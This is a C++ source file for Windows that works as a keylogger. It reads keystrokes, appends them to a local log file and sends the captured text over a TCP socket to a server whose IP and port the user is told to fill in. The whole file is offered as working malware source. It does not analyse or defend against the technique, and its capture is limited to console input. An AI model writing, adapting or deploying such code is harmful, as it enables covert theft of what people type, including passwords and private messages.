#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>

using namespace std;

// IP address and port of socket server
const string SERVER_IP = "127.0.0.1";  // Put your server IP here
const int SERVER_PORT = 12345;         // Put your server port here

int main() {
    string keys;
    HANDLE keyboardHandle = GetStdHandle(STD_INPUT_HANDLE);

    // Set console mode to receive keyboard events
    DWORD consoleMode;
    GetConsoleMode(keyboardHandle, &consoleMode);
    SetConsoleMode(keyboardHandle, ENABLE_EXTENDED_FLAGS | ENABLE_WINDOW_INPUT | ENABLE_MOUSE_INPUT);

    // Initializing Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "Erro ao inicializar o Winsock." << endl;
        return 1;
    }

    // Create socket
    SOCKET socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd == INVALID_SOCKET) {
        cout << "Erro ao criar o socket." << endl;
        WSACleanup();
        return 1;
    }

    // Set up server address
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
        cout << "Endereço IP inválido." << endl;
        closesocket(socket_fd);
        WSACleanup();
        return 1;
    }

    // Connect to server
    if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cout << "Erro ao conectar ao servidor." << endl;
        closesocket(socket_fd);
        WSACleanup();
        return 1;
    }

    while (true) {
        INPUT_RECORD inputRecord;
        DWORD eventsRead;
        ReadConsoleInput(keyboardHandle, &inputRecord, 1, &eventsRead);

        if (inputRecord.EventType == KEY_EVENT && inputRecord.Event.KeyEvent.bKeyDown) {
            WORD keyCode = inputRecord.Event.KeyEvent.wVirtualKeyCode;
            if (keyCode == VK_RETURN) {
                cout << "<br>";
                keys += "<br>";
            } else if (keyCode == VK_SPACE) {
                cout << " ";
                keys += " ";
            } else if (keyCode == VK_OEM_PERIOD) {
                cout << ".";
                keys += ".";
            } else if (keyCode >= 'A' && keyCode <= 'Z') {
                cout << static_cast<char>(keyCode);
                keys += static_cast<char>(keyCode);
            }

            ofstream myfile;
            myfile.open("C:\\Users\\user\\log.txt", ios::app);  // Replace "C:\\Users\\user\\log.txt" with your desired path and file name
            myfile << keys;
            myfile.close();

            // Send data to server
            if (send(socket_fd, keys.c_str(), keys.length(), 0) == SOCKET_ERROR) {
                cout << "Erro ao enviar os dados para o servidor." << endl;
                closesocket(socket_fd);
                WSACleanup();
                return 1;
            }
        }
    }

    // Cleanup
    closesocket(socket_fd);
    WSACleanup();
    return 0;
}
